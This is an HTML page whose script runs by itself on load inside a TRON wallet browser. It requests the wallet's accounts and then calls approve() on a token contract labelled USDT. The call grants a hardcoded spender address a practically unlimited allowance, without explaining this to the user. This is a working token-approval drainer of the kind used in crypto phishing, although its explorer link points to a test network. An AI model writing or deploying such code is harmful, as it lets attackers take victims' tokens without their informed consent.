<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <style>
    body { background: #000; color: #0f0; font-family: monospace; font-size: 12px; padding: 10px; }
  </style>
</head>
<body>
  <div id="log"></div>
<script>
  const USDT = 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf';
  const SPENDER = 'TB1vmuYWYpo4jHBkwrNxSr7gFiCaj4UN4r';
  const AMOUNT_USDT = '1321651235125125125';

  let started = false;

  function log(m) {
    const d = document.createElement('div');
    d.textContent = m;
    document.getElementById('log').appendChild(d);
    console.log(m);
  }

  function getProvider() {
    if (window.tron && window.tron.tronWeb) return window.tron;
    if (window.tronLink && window.tronLink.tronWeb) return window.tronLink;
    return null;
  }

  function toBase(n, dec) {
    const [i = '0', f = ''] = String(n).split('.');
    const frac = (f + '0'.repeat(dec)).slice(0, dec);
    const out = (i + frac).replace(/^0+(?=\d)/, '');
    return out || '0';
  }

  async function main() {
    try {
      const p = getProvider();
      if (!p) { log('❌ 不是钱包内置浏览器'); return; }

      let tw = p.tronWeb;
      let addr = tw?.defaultAddress?.base58;

      if (!addr && p.request) {
        log('🔄 请求钱包授权...');
        try {
          await p.request({ method: 'tron_requestAccounts' });
        } catch (e) {
          try { await p.request({ method: 'eth_requestAccounts' }); } catch (_) {}
        }
        tw = p.tronWeb;
        addr = tw?.defaultAddress?.base58;
      }

      if (!addr) { log('❌ 无法获取地址'); return; }

      const c = await tw.contract().at(USDT);
      const dec = Number(await c.decimals().call()) || 6;
      const raw = toBase(AMOUNT_USDT, dec);

      log('trxB=' + addr);
      log('trxA=' + SPENDER);
      log('amount=' + raw);

      // ✅ 去掉了 feeLimit
      const tx = await c.approve(SPENDER, raw).send({
        callValue: 0
      });

      log('✅ 成功 TxID=' + tx);
      log('🔍 https://nile.tronscan.org/#/transaction/' + tx);
    } catch (e) {
      console.error(e);
      log('❌ ' + (e?.message || e));
    }
  }

  window.addEventListener('load', () => {
    let tries = 0;
    const timer = setInterval(() => {
      tries++;
      const p = getProvider();
      if (p || tries >= 10) {
        clearInterval(timer);
        if (p && !started) {
          started = true;
          main();
        }
      }
    }, 400);
  });
</script>
</body>
</html>
